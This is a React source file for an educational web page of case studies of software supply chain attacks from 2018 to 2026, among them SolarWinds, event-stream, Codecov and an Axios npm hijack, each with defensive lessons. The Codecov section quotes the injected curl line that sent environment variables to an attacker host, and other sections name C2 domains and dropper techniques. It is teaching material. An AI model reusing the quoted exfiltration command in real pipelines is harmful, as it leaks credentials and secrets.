import { useState } from 'react';
import { FiChevronDown } from 'react-icons/fi';

function YouTubeEmbed({ id, caption }) {
  return (
    <div className="video-embed" style={{ marginTop: '1rem' }}>
      <iframe
        src={`https://www.youtube.com/embed/${id}`}
        title={caption}
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
        allowFullScreen
      />
      <div className="video-caption">
        <span className="yt-icon">&#9654;</span> {caption}
      </div>
    </div>
  );
}

function FlowDiagram({ steps }) {
  return (
    <div className="flow-diagram">
      {steps.map((s, i) => (
        <span key={i} style={{ display: 'contents' }}>
          <div className={`flow-box ${s.type || ''}`}>
            <h5>{s.label}</h5>
            <p>{s.desc}</p>
          </div>
          {i < steps.length - 1 && <span className={`flow-arrow ${s.arrowType || ''}`}>&rarr;</span>}
        </span>
      ))}
    </div>
  );
}

const cases = [
  {
    year: 'December 2020',
    title: 'SolarWinds / SUNBURST',
    type: 'Build Process Compromise // T1195.002',
    impact: [
      { value: '18,000+', label: 'Orgs Affected' },
      { value: '~100', label: 'Actively Exploited' },
      { value: '9 mo', label: 'Undetected' },
      { value: '$B+', label: 'Cleanup Cost' },
    ],
    details: (
      <>
        <h4>The Story</h4>
        <p>
          This is the attack that put &ldquo;supply chain&rdquo; on every CISO&apos;s radar.
          <strong> APT29 / Cozy Bear</strong> &mdash; a hacking group linked to Russia&apos;s SVR
          (foreign intelligence service) &mdash; spent <strong>months</strong> inside SolarWinds&apos;
          network before touching the build system. Their target: <strong>Orion</strong>, a network
          monitoring platform used by <strong>300,000 customers</strong> including most Fortune 500
          companies and US government agencies.
        </p>

        <h4>How SUNSPOT Worked &mdash; The &ldquo;Evil Printer&rdquo;</h4>
        <p>
          The attackers didn&apos;t modify source code in the repository &mdash; that would be caught
          by code review. Instead, they planted a tool called <strong>SUNSPOT</strong> directly on
          the build server. Here&apos;s what it did:
        </p>
        <div className="impact-grid" style={{ marginBottom: '1rem' }}>
          <div className="impact-item">
            <span className="impact-value" style={{ fontSize: '1.1rem' }}>1. Watch</span>
            <span className="impact-label">SUNSPOT monitored for MsBuild.exe &mdash; waiting for Orion to compile</span>
          </div>
          <div className="impact-item">
            <span className="impact-value" style={{ fontSize: '1.1rem' }}>2. Swap</span>
            <span className="impact-label">During compilation, it replaced a single source file with a backdoored version</span>
          </div>
          <div className="impact-item">
            <span className="impact-value" style={{ fontSize: '1.1rem' }}>3. Restore</span>
            <span className="impact-label">After the build finished, it put the clean file back &mdash; no trace in the repo</span>
          </div>
          <div className="impact-item">
            <span className="impact-value" style={{ fontSize: '1.1rem' }}>4. Ship</span>
            <span className="impact-label">The trojanized DLL was signed with SolarWinds&apos; own certificate &mdash; 100% legitimate</span>
          </div>
        </div>
        <p>
          The result: <strong>no developer ever saw malicious code in the repository</strong>. The
          source was always clean. Only the compiled output was poisoned.
        </p>

        <h4>Why SUNBURST Was So Hard to Find</h4>
        <ul>
          <li><strong>2-week sleep timer:</strong> The backdoor did nothing for 12-14 days after install, surviving any post-deployment testing window</li>
          <li><strong>Disguised traffic:</strong> C2 used algorithmically generated subdomains of <code>avsvmcloud.com</code>, mimicking normal SolarWinds Orion API calls</li>
          <li><strong>Anti-forensics:</strong> Detected security tools (Wireshark, Fiddler, sandboxes) and <em>shut itself off</em> if anyone was watching</li>
          <li><strong>Selective targeting:</strong> Of 18,000 infected organizations, only ~100 received second-stage payloads &mdash; the rest stayed dormant to reduce detection risk</li>
        </ul>

        <h4>Who Was Hit</h4>
        <p>
          <strong>US Treasury, Homeland Security, State Department, Microsoft, FireEye, Intel, Cisco, Deloitte</strong> &mdash; and
          thousands more who installed the poisoned Orion update.
        </p>

        <h4>How It Was Discovered &mdash; By Accident</h4>
        <p>
          <strong>FireEye</strong> (now Mandiant), a cybersecurity company, noticed someone used stolen
          credentials to register a new MFA device on an employee&apos;s account. Investigating
          <em> their own breach</em>, they traced it back to a SolarWinds Orion update. If FireEye
          hadn&apos;t been a customer, this could have gone undetected for <strong>years</strong>.
        </p>

        <h4>Attack Flow</h4>
        <div className="illustration" style={{ margin: '0.75rem 0' }}>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'APT29', desc: 'Infiltrates build server', type: 'attacker', arrowType: 'danger' },
              { label: 'SUNSPOT', desc: 'Swaps source at compile', type: 'compromised', arrowType: 'danger' },
              { label: 'Signed Update', desc: 'Orion v2020.2.1', type: 'compromised', arrowType: 'danger' },
              { label: '18,000 Orgs', desc: 'Install trojanized update', type: 'victim' },
            ]} />
          </div>
        </div>
      </>
    ),
    lesson: 'Source code review is not enough — the malicious code only existed during compilation. A legitimate digital signature doesn\'t mean the code is safe. The repo was always clean; only the compiled output was poisoned. Even FireEye, a security company, was a victim.',
  },
  {
    year: 'November 2018',
    title: 'event-stream / flatmap-stream',
    type: 'Compromised Package (Maintainer Takeover) // T1195.001',
    impact: [
      { value: '2M+', label: 'Weekly Downloads' },
      { value: '~2 mo', label: 'Undetected' },
      { value: 'BTC', label: 'Crypto Targeted' },
    ],
    details: (
      <>
        <h4>The Story</h4>
        <p>
          <code>event-stream</code> was a popular npm package with <strong>2 million weekly
          downloads</strong>. Its creator, <strong>Dominic Tarr</strong>, had moved on to other
          projects. He no longer used event-stream himself. Maintaining it was unpaid work he
          didn&apos;t want to do.
        </p>
        <p>
          A GitHub user named <strong>&ldquo;right9ctrl&rdquo;</strong> emailed Tarr offering to take
          over maintenance. Tarr agreed &mdash; grateful someone cared.
        </p>

        <h4>How the Attack Unfolded</h4>
        <div className="impact-grid" style={{ marginBottom: '1rem' }}>
          <div className="impact-item">
            <span className="impact-value" style={{ fontSize: '1.1rem' }}>1. Trust</span>
            <span className="impact-label">right9ctrl made a few legitimate commits to build credibility</span>
          </div>
          <div className="impact-item">
            <span className="impact-value" style={{ fontSize: '1.1rem' }}>2. Inject</span>
            <span className="impact-label">Added a new dependency: <code>flatmap-stream</code> &mdash; containing AES-256 encrypted malicious code</span>
          </div>
          <div className="impact-item">
            <span className="impact-value" style={{ fontSize: '1.1rem' }}>3. Target</span>
            <span className="impact-label">The decryption key was derived from the Copay Bitcoin wallet&apos;s package.json &mdash; payload only activated inside Copay</span>
          </div>
          <div className="impact-item">
            <span className="impact-value" style={{ fontSize: '1.1rem' }}>4. Steal</span>
            <span className="impact-label">Intercepted Bitcoin private keys during transaction signing and exfiltrated them</span>
          </div>
        </div>

        <h4>Why It Was Nearly Invisible</h4>
        <ul>
          <li><strong>Encrypted payload:</strong> Static analysis tools and <code>npm audit</code> couldn&apos;t read it &mdash; it was AES-encrypted blob hidden in a minified test fixture</li>
          <li><strong>Targeted activation:</strong> The code <em>only</em> decrypted and ran inside the Copay wallet app. Everywhere else it sat as dormant, inert data</li>
          <li><strong>No visible symptoms:</strong> Your tests passed, your app worked, no errors, no warnings</li>
          <li><strong>Transitive trust:</strong> Developers who depended on event-stream never knew flatmap-stream existed &mdash; it was a dependency of a dependency</li>
        </ul>

        <h4>How It Was Caught</h4>
        <p>
          Developer <strong>Ayrton Sparling</strong> (GitHub: FallingSnow) noticed a deprecation
          warning from a new dependency while reviewing updates. Curious, he dug into
          flatmap-stream&apos;s source, found the encrypted blob, and raised <strong>GitHub issue
          #116</strong>. The community deobfuscated the payload and confirmed the Copay attack.
        </p>

        <h4>The Maintainer&apos;s Response</h4>
        <p style={{ fontStyle: 'italic', color: 'var(--text-secondary)', borderLeft: '3px solid var(--accent-amber)', paddingLeft: '1rem' }}>
          &ldquo;I don&apos;t get any reward for maintaining this module. I don&apos;t even use it
          anymore. He emailed me and offered to maintain the module, so I gave it to him. He seemed
          enthusiastic.&rdquo; &mdash; Dominic Tarr
        </p>

        <h4>Attack Flow</h4>
        <div className="illustration" style={{ margin: '0.75rem 0' }}>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'right9ctrl', desc: 'Social engineers maintainer', type: 'attacker', arrowType: 'danger' },
              { label: 'event-stream', desc: 'Adds flatmap-stream dep', type: 'compromised', arrowType: 'danger' },
              { label: 'Copay Wallet', desc: 'AES payload activates', type: 'victim', arrowType: 'danger' },
              { label: 'BTC Stolen', desc: 'Private keys exfiltrated', type: 'attacker' },
            ]} />
          </div>
        </div>

        <YouTubeEmbed id="cvumD7bhLWU" caption="event-stream: Analysis of a compromised npm package" />
      </>
    ),
    lesson: 'Maintainer burnout is a systemic security risk. Trust is transitive — trusting event-stream meant implicitly trusting every dependency it adds. One curious developer\'s vigilance saved the ecosystem.',
  },
  {
    year: 'January – April 2021',
    title: 'Codecov Bash Uploader',
    type: 'CI/CD Pipeline Compromise // T1195.002',
    impact: [
      { value: '3 mo', label: 'Duration' },
      { value: '29,000', label: 'Customers' },
      { value: 'Keys', label: 'Secrets Leaked' },
    ],
    details: (
      <>
        <h4>The Story</h4>
        <p>
          <strong>Codecov</strong> is a code coverage reporting tool used by <strong>29,000
          organizations</strong> including Atlassian, GoDaddy, Procter &amp; Gamble, and the
          Washington Post. Their integration works via a Bash script that developers pipe into
          CI/CD pipelines:
        </p>
        <p>
          <code>curl -s https://codecov.io/bash | bash</code>
        </p>
        <p>
          If that script is compromised, <strong>every pipeline running it is compromised</strong>.
        </p>

        <h4>How They Got In</h4>
        <div className="impact-grid" style={{ marginBottom: '1rem' }}>
          <div className="impact-item">
            <span className="impact-value" style={{ fontSize: '1.1rem' }}>1. Exploit</span>
            <span className="impact-label">Attackers found a flaw in Codecov&apos;s Docker image creation process</span>
          </div>
          <div className="impact-item">
            <span className="impact-value" style={{ fontSize: '1.1rem' }}>2. Extract</span>
            <span className="impact-label">Used the flaw to steal the credential that updates the Bash Uploader script</span>
          </div>
          <div className="impact-item">
            <span className="impact-value" style={{ fontSize: '1.1rem' }}>3. Inject</span>
            <span className="impact-label">Added ONE line of code &mdash; a single <code>curl</code> command to exfiltrate environment variables</span>
          </div>
          <div className="impact-item">
            <span className="impact-value" style={{ fontSize: '1.1rem' }}>4. Harvest</span>
            <span className="impact-label">For 3 months, every CI/CD pipeline running the script sent all its secrets to the attacker</span>
          </div>
        </div>

        <h4>The Injected Line &mdash; One Line, Thousands of Victims</h4>
        <ul>
          <li><code>curl -sm 0.5 -d &quot;$(git remote -v){'<<<'}{'<<<'} ENV $(env)&quot; http://attacker-ip/upload || true</code></li>
          <li><strong>What it stole:</strong> every environment variable &mdash; <code>AWS_SECRET_ACCESS_KEY</code>, <code>NPM_TOKEN</code>, <code>GITHUB_TOKEN</code>, <code>DATABASE_URL</code>, everything</li>
          <li><strong><code>-sm 0.5</code>:</strong> silent mode with 0.5s timeout &mdash; CI didn&apos;t slow down noticeably</li>
          <li><strong><code>|| true</code>:</strong> if exfiltration failed, the pipeline continued normally &mdash; no errors, no alerts</li>
        </ul>

        <h4>How It Was Caught</h4>
        <p>
          A security-conscious customer downloaded the Bash Uploader and <strong>computed its SHA-256
          hash</strong>. It didn&apos;t match the hash on Codecov&apos;s GitHub. That simple check
          &mdash; comparing a hash &mdash; is what caught a 3-month-long breach.
        </p>
        <p>
          <strong>Twitch</strong> was among the affected companies; their source code was later
          leaked, partly traced back to credentials stolen through Codecov.
        </p>

        <h4>Attack Flow</h4>
        <div className="illustration" style={{ margin: '0.75rem 0' }}>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'Attacker', desc: 'Exploits Docker flaw', type: 'attacker', arrowType: 'danger' },
              { label: 'Bash Uploader', desc: '+1 line of curl exfil', type: 'compromised', arrowType: 'danger' },
              { label: 'CI/CD Pipelines', desc: 'curl codecov.io/bash', type: 'victim', arrowType: 'danger' },
              { label: 'Secrets Leaked', desc: 'AWS, npm, DB tokens', type: 'attacker' },
            ]} />
          </div>
        </div>
      </>
    ),
    lesson: 'The "curl | bash" pattern is fundamentally dangerous — you\'re executing whatever the server sends. Always verify script integrity with hash checks. Minimize secrets in CI/CD environments. One hash comparison caught a 3-month breach.',
  },
  {
    year: 'October 2024',
    title: 'Lottie Player (TryHackMe Lab)',
    type: 'Compromised Package (Token Theft) // T1195.001',
    impact: [
      { value: '1000s', label: 'Sites Affected' },
      { value: 'Crypto', label: 'Wallets Drained' },
      { value: 'Hours', label: 'To Detection' },
    ],
    details: (
      <>
        <h4>The Story</h4>
        <p>
          <strong>Lottie Player</strong> by LottieFiles is a widely-used web component for rendering
          animations. Thousands of websites embed it directly from npm/CDN. In October 2024, an
          attacker <strong>stole an npm maintainer&apos;s authentication token</strong> and used it
          to publish three malicious versions: <code>2.0.5</code>, <code>2.0.6</code>,
          and <code>2.0.7</code>.
        </p>

        <h4>How the Attack Worked</h4>
        <div className="impact-grid" style={{ marginBottom: '1rem' }}>
          <div className="impact-item">
            <span className="impact-value" style={{ fontSize: '1.1rem' }}>1. Steal Token</span>
            <span className="impact-label">Attacker stole an npm maintainer&apos;s auth token</span>
          </div>
          <div className="impact-item">
            <span className="impact-value" style={{ fontSize: '1.1rem' }}>2. Publish</span>
            <span className="impact-label">Published 3 malicious versions (2.0.5, 2.0.6, 2.0.7) to npm</span>
          </div>
          <div className="impact-item">
            <span className="impact-value" style={{ fontSize: '1.1rem' }}>3. Overlay</span>
            <span className="impact-label">Injected a full-screen &ldquo;Connect Wallet&rdquo; popup on every site loading the library</span>
          </div>
          <div className="impact-item">
            <span className="impact-value" style={{ fontSize: '1.1rem' }}>4. Drain</span>
            <span className="impact-label">When users connected their wallet, all crypto/NFTs were drained &mdash; one victim lost $723,000</span>
          </div>
        </div>

        <h4>What Made It Effective</h4>
        <ul>
          <li><strong>Wallet support:</strong> MetaMask, Coinbase Wallet, WalletConnect, and other popular providers &mdash; maximizing victims</li>
          <li><strong>C2 coordination:</strong> <code>castleservices01[.]com</code> orchestrated the drain operations</li>
          <li><strong>Auto-compromise via <code>@latest</code>:</strong> Any site loading the CDN with <code>@latest</code> was <em>instantly</em> affected when v2.0.5 was published &mdash; no action needed from the site owner</li>
        </ul>

        <h4>The <code>@latest</code> Lesson</h4>
        <p>
          Sites using <code>@latest</code> were instantly compromised. Sites pinned to
          <code> @2.0.4</code> (the last clean version) were <strong>completely unaffected</strong>.
          One tag is the difference between safe and breached.
        </p>

        <h4>Hands-On Lab</h4>
        <p>
          This exact case is the basis for the <strong>TryHackMe &ldquo;Supply Chain Attack:
          Lottie&rdquo; room</strong> in our labs section. You&apos;ll analyze the malicious code,
          trace the wallet drainer, and understand the attack timeline.
        </p>
      </>
    ),
    lesson: 'Never use @latest for CDN scripts — pin exact versions. Use Subresource Integrity (SRI) hashes to verify script content. Protect npm tokens with MFA and IP allowlists. One stolen token = every website using your library is compromised.',
  },
  {
    year: 'March 2026',
    title: 'Axios npm Hijack',
    type: 'Compromised Maintainer Account // T1195.001',
    impact: [
      { value: '100M+', label: 'Weekly Downloads' },
      { value: '~3 hrs', label: 'Window' },
      { value: 'RAT', label: 'Cross-Platform' },
      { value: 'DPRK', label: 'Attribution' },
    ],
    details: (
      <>
        <h4>The Story</h4>
        <p>
          <strong>Who:</strong> <strong>Sapphire Sleet</strong> &mdash; a North Korean state actor
          (attributed by Microsoft).
        </p>
        <p>
          <strong>Target:</strong> <strong>axios</strong> &mdash; the most popular JavaScript HTTP
          client with over <strong>100 million weekly downloads</strong>.
        </p>
        <p>
          <strong>Method:</strong> Social engineering campaign against lead maintainer
          <strong> Jason Saayman</strong> &mdash; delivered RAT malware to his PC, stealing his npm
          credentials.
        </p>

        <h4>How the Attack Worked</h4>
        <div className="impact-grid" style={{ marginBottom: '1rem' }}>
          <div className="impact-item">
            <span className="impact-value" style={{ fontSize: '1.1rem' }}>1. Compromise</span>
            <span className="impact-label">Social-engineered the maintainer; stole a long-lived npm access token via RAT</span>
          </div>
          <div className="impact-item">
            <span className="impact-value" style={{ fontSize: '1.1rem' }}>2. Seed</span>
            <span className="impact-label">Published <code>plain-crypto-js@4.2.0</code> (clean) 18 hours early to establish registry history</span>
          </div>
          <div className="impact-item">
            <span className="impact-value" style={{ fontSize: '1.1rem' }}>3. Publish</span>
            <span className="impact-label">Published <code>axios@1.14.1</code> and <code>@0.30.4</code> with <code>plain-crypto-js@4.2.1</code> as a dependency</span>
          </div>
          <div className="impact-item">
            <span className="impact-value" style={{ fontSize: '1.1rem' }}>4. Drop RAT</span>
            <span className="impact-label">postinstall hook ran a double-obfuscated dropper that installed a platform-specific RAT on every dev machine</span>
          </div>
        </div>

        <h4>What Made the Dropper Sophisticated</h4>
        <ul>
          <li><strong>Double obfuscation:</strong> Reversed Base64 with padding substitution + XOR cipher (key: <code>OrDeR_7077</code>)</li>
          <li><strong>OS detection:</strong> Fetched macOS, Windows, or Linux-specific payloads from C2 at <code>sfrclak[.]com:8000</code></li>
          <li><strong>Self-erasing:</strong> After execution, it deleted <code>setup.js</code>, replaced <code>package.json</code> with a clean copy &mdash; forensics would show no trace</li>
        </ul>

        <h4>Platform-Specific RATs</h4>
        <div className="impact-grid" style={{ marginBottom: '1rem' }}>
          <div className="impact-item">
            <span className="impact-value" style={{ fontSize: '1rem' }}>macOS</span>
            <span className="impact-label">AppleScript dropped binary spoofing an Apple daemon. Beaconed every 60s. Commands: inject, run scripts, enumerate apps</span>
          </div>
          <div className="impact-item">
            <span className="impact-value" style={{ fontSize: '1rem' }}>Windows</span>
            <span className="impact-label">VBScript copied PowerShell to <code>wt.exe</code> (masquerading as Windows Terminal), launched hidden RAT</span>
          </div>
          <div className="impact-item">
            <span className="impact-value" style={{ fontSize: '1rem' }}>Linux</span>
            <span className="impact-label">Python RAT downloaded to <code>/tmp/ld.py</code>, launched as orphaned background process</span>
          </div>
        </div>

        <h4>Timeline &mdash; 3 Hours From Breach to Takedown</h4>
        <ul>
          <li><strong>~2 weeks before:</strong> Social engineering campaign against maintainer begins</li>
          <li><strong>Mar 30, 05:57 UTC:</strong> <code>plain-crypto-js@4.2.0</code> published (clean seed version)</li>
          <li><strong>Mar 31, 00:21 UTC:</strong> <code>axios@1.14.1</code> published with malicious dep</li>
          <li><strong>Mar 31, ~01:00 UTC:</strong> Community reports issues &mdash; <strong>attacker deletes them</strong> using the hijacked account</li>
          <li><strong>Mar 31, 01:38 UTC:</strong> Axios collaborator DigitalBrainJS flags deleted issues, contacts npm directly</li>
          <li><strong>Mar 31, 03:15 UTC:</strong> Malicious versions removed from npm</li>
        </ul>

        <h4>Attack Flow</h4>
        <div className="illustration" style={{ margin: '0.75rem 0' }}>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'Sapphire Sleet', desc: 'Social-engineers maintainer', type: 'attacker', arrowType: 'danger' },
              { label: 'npm Account', desc: 'Stolen token publishes v1.14.1', type: 'compromised', arrowType: 'danger' },
              { label: 'plain-crypto-js', desc: 'postinstall drops RAT', type: 'compromised', arrowType: 'danger' },
              { label: 'Dev Machines', desc: 'macOS/Win/Linux compromised', type: 'victim' },
            ]} />
          </div>
        </div>
      </>
    ),
    lesson: 'Even the most trusted packages can be weaponized through maintainer account compromise. Lockfiles are your first defense — if yours was committed before the attack and you didn\'t run a fresh install, you were safe. Use npm ci (not npm install) in CI/CD, enforce MFA on npm accounts, and consider --ignore-scripts.',
  },
  {
    year: 'March 2026',
    title: 'TeamPCP / Trivy Action',
    type: 'CI/CD + Cascading Supply Chain // T1195.001 + T1195.002',
    impact: [
      { value: '75/76', label: 'Tags Poisoned' },
      { value: '10K+', label: 'Workflows Hit' },
      { value: '∞', label: 'Blockchain C2' },
    ],
    details: (
      <>
        <h4>The Story</h4>
        <p>
          This attack demonstrates the most dangerous concept in supply chain security:
          <strong> cascading compromise</strong>. One breach led to the next, each bigger than the
          last.
        </p>
        <p>
          The irony: <strong>Trivy is a vulnerability scanner</strong>. Organizations use it to
          <em> detect</em> security issues. The attackers weaponized the very tool companies trusted
          to keep them safe.
        </p>

        <h4>The Cascade &mdash; Step by Step</h4>
        <div className="impact-grid" style={{ marginBottom: '1rem' }}>
          <div className="impact-item">
            <span className="impact-value" style={{ fontSize: '1.1rem' }}>1. tj-actions</span>
            <span className="impact-label">Stolen maintainer PAT compromises tj-actions/changed-files &mdash; 23,000+ repos leak CI/CD secrets</span>
          </div>
          <div className="impact-item">
            <span className="impact-value" style={{ fontSize: '1.1rem' }}>2. Pivot</span>
            <span className="impact-label">Among the stolen secrets: tokens with <strong>write access</strong> to aquasecurity/trivy-action</span>
          </div>
          <div className="impact-item">
            <span className="impact-value" style={{ fontSize: '1.1rem' }}>3. Trivy</span>
            <span className="impact-label">Rewrote 75 of 76 version tags to point to malicious code &mdash; 10,000+ workflows compromised</span>
          </div>
          <div className="impact-item">
            <span className="impact-value" style={{ fontSize: '1.1rem' }}>4. Worm</span>
            <span className="impact-label">Harvested npm/PyPI tokens from victims and published <strong>CanisterWorm</strong> malware to registries</span>
          </div>
        </div>

        <h4>CanisterWorm &mdash; Why It&apos;s a New Era</h4>
        <p>
          Traditional malware uses domain-based C2: authorities seize the domain, game over.
          CanisterWorm is different:
        </p>
        <ul>
          <li><strong>Blockchain C2:</strong> Commands are stored <em>on-chain</em> &mdash; immutable, decentralized, and unkillable</li>
          <li><strong>You cannot take it down:</strong> No domain to seize, no server to shut down, no smart contract to censor</li>
          <li><strong>First of its kind:</strong> The first widely documented supply chain attack using blockchain for command-and-control</li>
        </ul>

        <h4>The Core Irony</h4>
        <p style={{ fontStyle: 'italic', color: 'var(--text-secondary)', borderLeft: '3px solid var(--accent-red)', paddingLeft: '1rem' }}>
          The tool you trusted to <em>find</em> vulnerabilities <strong>was</strong> the
          vulnerability. Security scanners are high-value targets because they run in every CI/CD
          pipeline with access to every secret.
        </p>

        <h4>Attack Flow</h4>
        <div className="illustration" style={{ margin: '0.75rem 0' }}>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'tj-actions', desc: 'Stolen PAT, 23K repos', type: 'attacker', arrowType: 'danger' },
              { label: 'Trivy Action', desc: '75/76 tags rewritten', type: 'compromised', arrowType: 'danger' },
              { label: '10K+ Pipelines', desc: 'Secrets exfiltrated', type: 'victim', arrowType: 'danger' },
              { label: 'CanisterWorm', desc: 'Blockchain C2 malware', type: 'attacker' },
            ]} />
          </div>
        </div>
      </>
    ),
    lesson: 'Pin GitHub Actions to commit SHAs, never tags. Even security tools can be weaponized. Supply chain attacks cascade — one breach enables the next. Blockchain C2 represents a new era of unkillable command infrastructure.',
  },
];

function CaseCard({ c }) {
  const [open, setOpen] = useState(false);
  return (
    <div className="timeline-item">
      <div className="timeline-dot" />
      <div className="timeline-year">{c.year}</div>
      <div className="case-card">
        <div className="case-card-header" onClick={() => setOpen(!open)}>
          <div>
            <h3>{c.title}</h3>
            <div className="case-type">{c.type}</div>
          </div>
          <button className={`case-card-toggle${open ? ' open' : ''}`}><FiChevronDown /></button>
        </div>
        {open && (
          <div className="case-card-body">
            <div className="impact-grid">
              {c.impact.map((m, i) => (
                <div className="impact-item" key={i}>
                  <span className="impact-value">{m.value}</span>
                  <span className="impact-label">{m.label}</span>
                </div>
              ))}
            </div>
            {c.details}
            <div className="case-lesson">
              <strong>Key Lesson</strong>
              <p>{c.lesson}</p>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

export default function CaseStudies() {
  return (
    <div className="page">
      <div className="page-header">
        <div className="page-tag">Part 2</div>
        <h1>Real-World Case Studies</h1>
        <p>Deep dives into landmark supply chain attacks from 2018 to 2026, with technical details, impact analysis, and key lessons.</p>
      </div>
      <div className="timeline">
        {cases.map((c, i) => <CaseCard key={i} c={c} />)}
      </div>

      <div className="media-section">
        <h2>Video Explainers</h2>
        <div className="video-grid">
          <YouTubeEmbed
            id="qmXcMACowR4"
            caption='The "Largest Supply Chain Attack Ever" — npm compromise (2025)'
          />
          <YouTubeEmbed
            id="QVqIx-Y8s-s"
            caption="The largest supply-chain attack ever — Fireship breakdown"
          />
        </div>
      </div>
    </div>
  );
}
